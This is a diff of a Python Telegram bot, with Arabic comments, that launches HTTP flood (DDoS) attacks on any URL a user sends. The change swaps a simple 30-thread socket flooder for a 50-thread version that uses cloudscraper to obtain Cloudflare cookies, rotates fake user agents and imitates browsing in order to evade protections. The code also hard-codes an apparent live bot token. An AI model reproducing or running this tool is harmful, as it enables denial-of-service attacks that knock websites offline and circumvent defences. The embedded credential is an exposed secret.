@@ -1,85 +1,94 @@
 import random
 import time
-import socket
 import threading
 import telebot
-from urllib.parse import urlparse
+import requests
+from fake_useragent import UserAgent
+from bs4 import BeautifulSoup
+import cloudscraper
 
-# إعدادات أساسية
-TOKEN = "7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU"
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")
 
-class SimpleDDoSTool:
+class SmartAttackTool:
     def __init__(self):
         self.active_attacks = {}
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)",
-            "Mozilla/5.0 (Linux; Android 10; SM-A505F)"
-        ]
+        self.ua = UserAgent()
+        self.scraper = cloudscraper.create_scraper()
+        self.cf_cookies = {}
 
-    def start_attack(self, chat_id, target, duration=60):
-        """بدء هجوم بسيط"""
+    def _get_cf_cookies(self, url):
+        """الحصول على كوكيز Cloudflare"""
         try:
-            # تحقق من صحة الرابط
-            if not target.startswith(('http://', 'https://')):
-                target = 'http://' + target
-            
-            parsed = urlparse(target)
-            host = parsed.netloc
-            port = 80  # افتراضي للHTTP
-            
-            if parsed.scheme == 'https':
-                port = 443
+            resp = self.scraper.get(url, timeout=10)
+            if resp.status_code == 200:
+                return resp.cookies.get_dict()
+        except:
+            return {}
 
-            stop_event = threading.Event()
-            threads = []
-
-            def attack():
-                while not stop_event.is_set():
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.settimeout(3)
-                        s.connect((host, port))
-                        
-                        # بناء طلب بسيط
-                        path = "/" + str(random.randint(1000, 9999))
-                        headers = {
-                            'User-Agent': random.choice(self.user_agents),
-                            'Accept': 'text/html',
-                            'Connection': 'keep-alive'
-                        }
-                        
-                        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-                        for key, value in headers.items():
-                            request += f"{key}: {value}\r\n"
-                        request += "\r\n"
-                        
-                        s.send(request.encode())
-                        time.sleep(0.5)
-                        s.close()
-                    except:
-                        pass
-
-            # بدء 30 خيط هجومي
-            for _ in range(30):
-                t = threading.Thread(target=attack)
-                t.daemon = True
-                t.start()
-                threads.append(t)
-
-            self.active_attacks[chat_id] = {
-                'stop_event': stop_event,
-                'threads': threads
-            }
-
-            # إيقاف الهجوم بعد المدة المحددة
-            threading.Timer(duration, self.stop_attack, [chat_id]).start()
-            
-            return True, f"بدأ الهجوم على {target} لمدة {duration} ثانية"
+    def _smart_request(self, url, cookies):
+        """طلب ذكي يتجاوز الحمايات"""
+        headers = {
+            'User-Agent': self.ua.random,
+            'Accept': 'text/html,application/xhtml+xml',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Referer': 'https://www.google.com/',
+            'Connection': 'keep-alive'
+        }
         
-        except Exception as e:
-            return False, f"خطأ: {str(e)}"
+        try:
+            # تغيير سلوك الطلب بشكل عشوائي
+            if random.random() > 0.7:
+                resp = requests.get(url, headers=headers, cookies=cookies, timeout=5)
+            else:
+                resp = self.scraper.get(url, headers=headers, cookies=cookies, timeout=5)
+            
+            # محاكاة تصفح حقيقي
+            if resp.status_code == 200:
+                soup = BeautifulSoup(resp.text, 'html.parser')
+                links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http')]
+                if links:
+                    time.sleep(random.uniform(1, 3))
+                    secondary_url = random.choice(links)
+                    requests.get(secondary_url, headers=headers, timeout=3)
+            
+            return True
+        except:
+            return False
+
+    def start_attack(self, chat_id, url, duration=60):
+        """بدء هجوم ذكي"""
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+
+        # الحصول على كوكيز الحماية
+        cf_cookies = self._get_cf_cookies(url)
+        if not cf_cookies:
+            return False, "فشل في تجاوز الحماية"
+
+        stop_event = threading.Event()
+        threads = []
+
+        def attacker():
+            while not stop_event.is_set():
+                self._smart_request(url, cf_cookies)
+                time.sleep(random.uniform(0.5, 2))
+
+        # بدء 50 خيط هجومي
+        for _ in range(50):
+            t = threading.Thread(target=attacker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+
+        self.active_attacks[chat_id] = {
+            'stop_event': stop_event,
+            'threads': threads,
+            'target': url
+        }
+
+        # إيقاف الهجوم بعد المدة
+        threading.Timer(duration, self.stop_attack, [chat_id]).start()
+        return True, f"✅ بدء الهجوم الذكي على {url}"
 
     def stop_attack(self, chat_id):
         """إيقاف الهجوم"""
@@ -91,36 +100,38 @@ class SimpleDDoSTool:
             return True
         return False
 
-# إنشاء الأداة
-tool = SimpleDDoSTool()
-
 # أوامر البوت
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "مرحباً! أوامر البوت:\n/attack [رابط] [وقت]\n/stop")
+    help_text = """
+    🚀 أوامر البوت المتطور:
+    /attack [رابط] [وقت] - بدء هجوم ذكي
+    /stop - إيقاف الهجوم
+    """
+    bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     try:
         parts = message.text.split()
         if len(parts) < 2:
-            bot.reply_to(message, "استخدم: /attack [رابط] [وقت]")
+            bot.reply_to(message, "استخدم: /attack [رابط] [وقت بالثواني]")
             return
         
-        target = parts[1]
+        url = parts[1]
         duration = int(parts[2]) if len(parts) > 2 else 60
         
-        success, response = tool.start_attack(message.chat.id, target, duration)
-        bot.reply_to(message, response)
+        success, msg = SmartAttackTool().start_attack(message.chat.id, url, duration)
+        bot.reply_to(message, msg)
     except Exception as e:
-        bot.reply_to(message, f"حدث خطأ: {str(e)}")
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(message):
-    if tool.stop_attack(message.chat.id):
-        bot.reply_to(message, "تم إيقاف الهجوم")
+    if SmartAttackTool().stop_attack(message.chat.id):
+        bot.reply_to(message, "✅ تم إيقاف الهجوم")
     else:
-        bot.reply_to(message, "لا يوجد هجوم نشط")
+        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط")
 
-print("البوت يعمل...")
+print("🟢 البوت يعمل...")
 bot.polling()
